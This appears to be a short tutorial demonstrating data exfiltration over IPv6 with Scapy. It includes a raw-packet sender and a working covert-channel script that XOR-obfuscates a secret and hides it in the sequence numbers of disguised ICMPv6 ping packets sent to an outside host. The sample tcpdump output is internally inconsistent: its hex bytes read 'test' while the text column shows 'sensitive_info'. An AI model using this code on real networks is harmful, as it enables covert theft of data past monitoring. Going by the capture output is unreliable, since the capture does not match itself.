# Example of Exfiltration over IPv6 Using Scapy

Libraries like scapy for Python make it easier for developers to interact with networking abstractions at a higher level. 
For example, with only two lines of code we are able to send a crafted packet to an IPv6 endpoint:

```
from scapy.all import IPv6,Raw,send
send(IPv6(dst="XXXX:XXX:X:1663:7a8a:20ff:fe43:93d4")/Raw(load="sensitive_info"))
```

And sniffing on the other endpoint we can see the packet reaching its destination with the extra raw layer where we included the ‘test’ string:

```
# tcpdump -s0 -l -X -i eth0 'ip6 and not icmp6'
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
23:47:15.996483 IP6 XXXX:XXX:X:1663::1ce > XXXX:XXX:X:1662:7a8a:20ff:fe43:93d4: no next header
        0x0000:  6000 0000 0004 3b3e XXXX XXXX XXXX 1663  `.....;>.......c
        0x0010:  0000 0000 0000 01ce XXXX XXXX XXXX 1662  ...............b
        0x0020:  7a8a 20ff fe43 93d4 7465 7374 0000       z....C..sensitive_info..
```


Another example:

```
from scapy.all import IPv6,ICMPv6EchoRequest,send
import sys

secret   = "THISISASECRET" # hidden info stored in the packet
endpoint = sys.argv[1] # addr where are we sending the data

# taken from a random ping6 packet
#        0x0030:  1e38 2c5f 0000 0000 4434 0100 0000 0000  .8,_....D4......
#        0x0040:  1011 1213 1415 1617 1819 1a1b 1c1d 1e1f  ................
#        0x0050:  2021 2223 2425 2627 2829 2a2b 2c2d 2e2f  .!"#$%&'()*+,-./
#        0x0060:  3031 3233 3435 3637                      01234567
data =  "\x1e\x38\x2c\x5f\x00\x00\x00\x00\x44\x34\x01\x00\x00\x00\x00\x00" \
        "\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f" \
        "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f" \
        "\x30\x31\x32\x33\x34\x35\x36\x37"

def sendpkt(d):
  if len(d) == 2:
    seq = (ord(d[0])<<8) + ord(d[1])
  else:
    seq = ord(d)
  send(IPv6(dst=endpoint)/ICMPv6EchoRequest(id=0x1337,seq=seq, data=data))

# encrypt data with key 0x17
xor = lambda x: ''.join([ chr(ord(c)^0x17) for c in x])

i=0
for b in range(0, len(secret), 2):
  sendpkt(xor(secret[b:b+2]))
```
